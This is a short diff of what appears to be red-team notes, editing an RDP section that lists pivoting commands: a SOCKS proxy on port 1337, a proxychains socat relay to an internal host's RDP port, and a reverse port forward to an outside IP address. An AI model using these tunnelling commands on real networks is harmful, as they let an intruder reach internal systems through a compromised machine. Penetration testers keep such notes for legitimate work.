@@ -25,9 +25,10 @@ PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::u
 
 ```
 
-### RDP
+###RDP
 ```
 socks 1337
+
 proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
 
 rportfwd 8080 178.62.56.134 80
